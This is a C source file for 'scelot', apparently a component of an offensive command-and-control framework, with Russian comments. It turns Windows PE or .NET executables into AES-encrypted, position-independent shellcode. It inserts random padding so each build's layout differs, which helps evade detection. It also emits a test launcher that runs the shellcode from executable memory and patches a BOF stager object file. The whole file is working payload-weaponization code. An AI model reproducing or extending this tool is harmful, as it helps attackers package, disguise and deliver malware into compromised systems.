// scelot.exe — generator. Reads a PE, encrypts it with a fresh AES-128 key,
// patches the stub blob with key/IV/size, glues [stub][instance][payload]
// and writes <out>.bin. Optionally emits a launcher .exe that runs the
// shellcode in-process for testing.
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include "instance.h"
#include "aes.h"
#include "rng.h"
#include "pe_parser.h"
#include "poly.h"

extern const unsigned char stub_x64_bin[];
extern const unsigned int  stub_x64_bin_len;
extern const unsigned char stub_x86_bin[];
extern const unsigned int  stub_x86_bin_len;

static void usage(void) {
    // Справка отключена: scelot вызывается клиентом из меню
    // "Generate Shellcode (scelot)", вручную пользователь его не запускает.
    // fputs(
    //     "scelot — PE/.NET to position-independent shellcode generator\n"
    //     "Usage: scelot <input.exe|.dll> -o <out.bin> [options]\n"
    //     "  -a x86|x64               target architecture (default: from input)\n"
    //     "  -e <name>                exported function name (DLL payloads)\n"
    //     "  -c <Class>               .NET class (Namespace.Class)\n"
    //     "  -m <Method>              .NET method\n"
    //     "  --args \"...\"             command-line forwarded to payload\n"
    //     "  --exit exit|thread|return  exit behaviour (default: exit)\n"
    //     "  --exe <path>             also emit a test launcher EXE\n",
    //     stdout);
}

static uint8_t* slurp(const char* path, uint32_t* out_size) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(h, NULL);
    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, sz);
    DWORD rd;
    ReadFile(h, buf, sz, &rd, NULL);
    CloseHandle(h);
    *out_size = sz;
    return buf;
}

static int spit(const char* path, const uint8_t* data, uint32_t size) {
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    DWORD wr;
    WriteFile(h, data, size, &wr, NULL);
    CloseHandle(h);
    return 0;
}

static int parse_exit_mode(const char* s) {
    if (lstrcmpA(s, "exit") == 0)   return SCELOT_EXIT_PROCESS;
    if (lstrcmpA(s, "thread") == 0) return SCELOT_EXIT_THREAD;
    if (lstrcmpA(s, "return") == 0) return SCELOT_EXIT_RETURN;
    return -1;
}

// Builds a tiny launcher EXE that calls the shellcode in-process. The
// shellcode receives its own base address in rcx (x64) per stage-2 contract.
// For brevity the launcher source is compiled lazily by writing a temp .c
// file and invoking cl.exe — keeps the generator self-contained on a dev box.
static int emit_launcher_exe(const char* exe_path, const char* bin_path, int arch) {
    char tmpdir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpdir);
    char cpath[MAX_PATH];
    wsprintfA(cpath, "%sscelot_launcher.c", tmpdir);
    HANDLE h = CreateFileA(cpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    static const char src[] =
        "#include <windows.h>\n"
        "#include <stdio.h>\n"
        "typedef void (*fn)(void);\n"
        "int main(int argc, char** argv) {\n"
        "  if (argc < 2) { puts(\"usage: launcher <bin>\"); return 1; }\n"
        "  HANDLE f = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);\n"
        "  DWORD sz = GetFileSize(f, 0);\n"
        "  void* p = VirtualAlloc(0, sz, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
        "  DWORD rd; ReadFile(f, p, sz, &rd, 0); CloseHandle(f);\n"
        "  ((fn)p)();\n"
        "  return 0;\n"
        "}\n";
    DWORD wr; WriteFile(h, src, sizeof(src) - 1, &wr, NULL); CloseHandle(h);

    char cmd[MAX_PATH * 4];
    wsprintfA(cmd, "cmd /c cl /nologo /O2 \"%s\" /Fe\"%s\" /link kernel32.lib > nul",
              cpath, exe_path);
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[!] failed to invoke cl.exe — open VS Native Tools cmd\n");
        return -2;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD ec; GetExitCodeProcess(pi.hProcess, &ec);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return (int)ec;
}

// COFF-patcher для BOF-стейджера. Использует заранее скомпилированный
// шаблон bof_stager_template.x64.o (см. stand/bof/bof_stager_template.c)
// и встраивает в его секцию .sc сгенерированный шеллкод. Никакого внешнего
// компилятора на стороне пользователя не требуется.
//
// Шаблон содержит 16-байтовый placeholder в секции .sc:
//   [8 байт magic][4 байта длина = 0][4 байта payload]
// scelot расширяет .sc до 12 + shellcode_size, обновляет SizeOfRawData /
// VirtualSize и сдвигает PointerToRawData / PointerToSymbolTable у всех
// последующих сущностей в COFF.

// Возвращает путь к шаблону рядом со scelot.exe.
static int find_bof_template(char* out_buf, DWORD out_buf_size) {
    DWORD n = GetModuleFileNameA(NULL, out_buf, out_buf_size);
    if (n == 0 || n >= out_buf_size) return -1;
    // Усекаем имя exe, оставляем директорию.
    for (int i = (int)n - 1; i >= 0; --i) {
        if (out_buf[i] == '\\' || out_buf[i] == '/') { out_buf[i + 1] = 0; break; }
    }
    lstrcatA(out_buf, "bof_stager_template.x64.o");
    return GetFileAttributesA(out_buf) == INVALID_FILE_ATTRIBUTES ? -1 : 0;
}

static int emit_bof_stager(const char* bof_path, const char* bin_path) {
    char tpl_path[MAX_PATH];
    if (find_bof_template(tpl_path, MAX_PATH) != 0) {
        printf("[!] bof_stager_template.x64.o not found next to scelot.exe\n");
        return -1;
    }

    uint32_t tpl_size;
    uint8_t* tpl = slurp(tpl_path, &tpl_size);
    if (!tpl) { printf("[!] cannot read %s\n", tpl_path); return -1; }

    uint32_t bin_size;
    uint8_t* bin = slurp(bin_path, &bin_size);
    if (!bin) {
        HeapFree(GetProcessHeap(), 0, tpl);
        printf("[!] cannot read %s\n", bin_path);
        return -1;
    }

    if (tpl_size < 20) {
        printf("[!] template too small\n");
        HeapFree(GetProcessHeap(), 0, tpl);
        HeapFree(GetProcessHeap(), 0, bin);
        return -1;
    }

    // Парсим IMAGE_FILE_HEADER.
    uint16_t nsec    = *(uint16_t*)(tpl + 2);
    uint32_t ptr_sym = *(uint32_t*)(tpl + 8);
    uint16_t opthdr  = *(uint16_t*)(tpl + 16);
    uint32_t sec_start = 20 + opthdr;

    if (sec_start + (uint32_t)nsec * 40 > tpl_size) {
        printf("[!] template malformed\n");
        HeapFree(GetProcessHeap(), 0, tpl);
        HeapFree(GetProcessHeap(), 0, bin);
        return -1;
    }

    // Ищем секцию .sc по имени.
    int sc_idx = -1;
    for (int i = 0; i < nsec; ++i) {
        const uint8_t* name = tpl + sec_start + i * 40;
        if (name[0] == '.' && name[1] == 's' && name[2] == 'c' &&
            (name[3] == 0 || name[3] == ' ')) {
            sc_idx = i; break;
        }
    }
    if (sc_idx < 0) {
        printf("[!] .sc section not found in template\n");
        HeapFree(GetProcessHeap(), 0, tpl);
        HeapFree(GetProcessHeap(), 0, bin);
        return -1;
    }

    uint32_t sc_hdr     = sec_start + sc_idx * 40;
    uint32_t sc_old_sz  = *(uint32_t*)(tpl + sc_hdr + 16); // SizeOfRawData
    uint32_t sc_old_ptr = *(uint32_t*)(tpl + sc_hdr + 20); // PointerToRawData

    uint32_t new_sc_sz = 12 + bin_size;  // magic(8) + len(4) + shellcode
    int32_t  delta = (int32_t)new_sc_sz - (int32_t)sc_old_sz;
    if (delta < 0) delta = 0;

    uint32_t new_total = tpl_size + (uint32_t)delta;
    uint8_t* out = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, new_total);
    if (!out) {
        HeapFree(GetProcessHeap(), 0, tpl);
        HeapFree(GetProcessHeap(), 0, bin);
        return -1;
    }

    // 1) Всё до raw data секции .sc — копируем как есть.
    for (uint32_t i = 0; i < sc_old_ptr; ++i) out[i] = tpl[i];

    // 2) В саму .sc записываем magic + length + шеллкод.
    uint8_t* sc_dst = out + sc_old_ptr;
    sc_dst[0] = 0xCE; sc_dst[1] = 0xCA; sc_dst[2] = 0xCE; sc_dst[3] = 0xCA;
    sc_dst[4] = 0x01; sc_dst[5] = 0x02; sc_dst[6] = 0x03; sc_dst[7] = 0x04;
    *(uint32_t*)(sc_dst + 8) = bin_size;
    for (uint32_t i = 0; i < bin_size; ++i) sc_dst[12 + i] = bin[i];

    // 3) Всё, что было ПОСЛЕ старой raw data .sc, сдвигаем на delta.
    uint32_t after_old = sc_old_ptr + sc_old_sz;
    uint32_t after_sz  = tpl_size - after_old;
    uint8_t* dst_after = out + sc_old_ptr + new_sc_sz;
    for (uint32_t i = 0; i < after_sz; ++i) dst_after[i] = tpl[after_old + i];

    // 4) Обновляем размер секции .sc.
    *(uint32_t*)(out + sc_hdr +  8) = new_sc_sz; // VirtualSize
    *(uint32_t*)(out + sc_hdr + 16) = new_sc_sz; // SizeOfRawData

    // 5) Сдвигаем PointerToRawData / PointerToRelocations / PointerToLinenumbers
    //    у всех секций, чьи указатели больше старого окончания .sc.
    for (int i = 0; i < nsec; ++i) {
        uint32_t hdr = sec_start + i * 40;
        uint32_t prd = *(uint32_t*)(out + hdr + 20);
        uint32_t prl = *(uint32_t*)(out + hdr + 24);
        uint32_t pln = *(uint32_t*)(out + hdr + 28);
        if (prd >= after_old) *(uint32_t*)(out + hdr + 20) = prd + (uint32_t)delta;
        if (prl >= after_old && prl != 0)
            *(uint32_t*)(out + hdr + 24) = prl + (uint32_t)delta;
        if (pln >= after_old && pln != 0)
            *(uint32_t*)(out + hdr + 28) = pln + (uint32_t)delta;
    }

    // 6) Сдвигаем PointerToSymbolTable в file header.
    if (ptr_sym >= after_old)
        *(uint32_t*)(out + 8) = ptr_sym + (uint32_t)delta;

    int rc = spit(bof_path, out, new_total);
    HeapFree(GetProcessHeap(), 0, out);
    HeapFree(GetProcessHeap(), 0, tpl);
    HeapFree(GetProcessHeap(), 0, bin);
    return rc;
}

int main(int argc, char** argv) {
    if (argc < 2) { usage(); return 1; }

    const char* in_path = argv[1];
    const char* out_path = NULL;
    const char* exe_path = NULL;
    const char* bof_path = NULL;
    const char* export_name = "";
    const char* net_class = "";
    const char* net_method = "";
    const char* args = "";
    int forced_arch = 0;
    int exit_mode = SCELOT_EXIT_PROCESS;

    for (int i = 2; i < argc; ++i) {
        if (lstrcmpA(argv[i], "-o") == 0 && i + 1 < argc) out_path = argv[++i];
        else if (lstrcmpA(argv[i], "-a") == 0 && i + 1 < argc) {
            ++i;
            if (lstrcmpA(argv[i], "x86") == 0) forced_arch = SCELOT_ARCH_X86;
            else if (lstrcmpA(argv[i], "x64") == 0) forced_arch = SCELOT_ARCH_X64;
        }
        else if (lstrcmpA(argv[i], "-e") == 0 && i + 1 < argc) export_name = argv[++i];
        else if (lstrcmpA(argv[i], "-c") == 0 && i + 1 < argc) net_class   = argv[++i];
        else if (lstrcmpA(argv[i], "-m") == 0 && i + 1 < argc) net_method  = argv[++i];
        else if (lstrcmpA(argv[i], "--args") == 0 && i + 1 < argc) args     = argv[++i];
        else if (lstrcmpA(argv[i], "--exit") == 0 && i + 1 < argc) {
            int em = parse_exit_mode(argv[++i]);
            if (em < 0) { printf("[!] bad --exit\n"); return 2; }
            exit_mode = em;
        }
        else if (lstrcmpA(argv[i], "--exe") == 0 && i + 1 < argc) exe_path = argv[++i];
        else if (lstrcmpA(argv[i], "--bof") == 0 && i + 1 < argc) bof_path = argv[++i];
        else { printf("[!] unknown arg: %s\n", argv[i]); return 2; }
    }
    if (!out_path) { usage(); return 2; }

    uint32_t pe_size;
    uint8_t* pe = slurp(in_path, &pe_size);
    if (!pe) { printf("[!] cannot read %s\n", in_path); return 3; }

    PE_INFO info;
    if (pe_inspect(pe, pe_size, &info) != 0) { printf("[!] bad PE\n"); return 4; }
    int arch = forced_arch ? forced_arch : info.arch;
    // For .NET assemblies, the CPU bitness of the PE doesn't matter — the
    // CLR JIT picks based on the host process. Native PEs require matching.
    if (forced_arch && forced_arch != info.arch && !info.is_dotnet) {
        printf("[!] arch mismatch: input is %s\n",
               info.arch == SCELOT_ARCH_X64 ? "x64" : "x86");
        return 5;
    }

    int payload_type;
    if (info.is_dotnet) payload_type = info.is_dll ? SCELOT_PAYLOAD_NET_DLL : SCELOT_PAYLOAD_NET_EXE;
    else                payload_type = info.is_dll ? SCELOT_PAYLOAD_PE_DLL  : SCELOT_PAYLOAD_PE_EXE;

    // Pick the matching stub blob.
    const uint8_t* stub_src;
    uint32_t stub_len;
    if (arch == SCELOT_ARCH_X64) { stub_src = stub_x64_bin; stub_len = stub_x64_bin_len; }
    else                          { stub_src = stub_x86_bin; stub_len = stub_x86_bin_len; }
    if (stub_len < 64) {
        printf("[!] stub blob is a placeholder (build the loader first)\n");
        return 6;
    }

    // Generate AES key + two IVs (one for instance, one for payload).
    uint8_t key[16], iv_inst[16], iv_payload[16];
    if (rng_fill(key, 16) || rng_fill(iv_inst, 16) || rng_fill(iv_payload, 16)) {
        printf("[!] RNG failed\n"); return 7;
    }

    // Build instance.
    SCELOT_INSTANCE inst;
    ZeroMemory(&inst, sizeof(inst));
    inst.magic = SCELOT_MAGIC;
    inst.instance_size = sizeof(inst);
    inst.payload_size  = pe_size;
    inst.payload_type  = payload_type;
    inst.arch          = arch;
    inst.exit_mode     = exit_mode;
    for (int i = 0; i < 16; ++i) inst.payload_iv[i] = iv_payload[i];
    lstrcpynA(inst.export_name, export_name, sizeof(inst.export_name));
    lstrcpynA(inst.net_class,   net_class,   sizeof(inst.net_class));
    lstrcpynA(inst.net_method,  net_method,  sizeof(inst.net_method));
    lstrcpynA(inst.args,        args,        sizeof(inst.args));

    // Encrypt instance and payload.
    AES128_CTX ctx;
    aes128_key_expand(&ctx, key);
    aes128_ctr_xcrypt(&ctx, iv_inst, (uint8_t*)&inst, sizeof(inst));
    aes128_ctr_xcrypt(&ctx, iv_payload, pe, pe_size);

    // Insert random padding (4..63 bytes) between stub and Instance to
    // change the structural size of the blob between generations. The
    // stub-size placeholder will be set to (stub_len + pad_len) so the
    // loader still locates Instance correctly.
    uint8_t pad_byte;
    rng_fill(&pad_byte, 1);
    uint32_t pad_len = 4 + (pad_byte & 0x3F); // 4..67
    uint8_t pad[128];
    rng_fill(pad, pad_len);

    uint8_t* stub = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, stub_len);
    for (uint32_t i = 0; i < stub_len; ++i) stub[i] = stub_src[i];
    if (poly_patch_stub(stub, stub_len, stub_len + pad_len, key, iv_inst) != 0) {
        printf("[!] stub placeholder patching failed\n");
        return 8;
    }

    // Glue [stub][pad][instance][payload].
    uint32_t total = stub_len + pad_len + sizeof(inst) + pe_size;
    uint8_t* out = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, total);
    uint32_t off = 0;
    for (uint32_t i = 0; i < stub_len; ++i)    out[off++] = stub[i];
    for (uint32_t i = 0; i < pad_len; ++i)     out[off++] = pad[i];
    for (uint32_t i = 0; i < sizeof(inst); ++i) out[off++] = ((uint8_t*)&inst)[i];
    for (uint32_t i = 0; i < pe_size; ++i)      out[off++] = pe[i];
    if (spit(out_path, out, total) != 0) { printf("[!] write failed\n"); return 9; }
    printf("[+] wrote %s (%u bytes)\n", out_path, total);

    if (exe_path) {
        if (emit_launcher_exe(exe_path, out_path, arch) == 0)
            printf("[+] wrote launcher %s\n", exe_path);
        else
            printf("[!] launcher build failed\n");
    }
    if (bof_path) {
        if (emit_bof_stager(bof_path, out_path) == 0)
            printf("[+] wrote BOF stager %s\n", bof_path);
        else
            printf("[!] BOF stager build failed\n");
    }
    return 0;
}
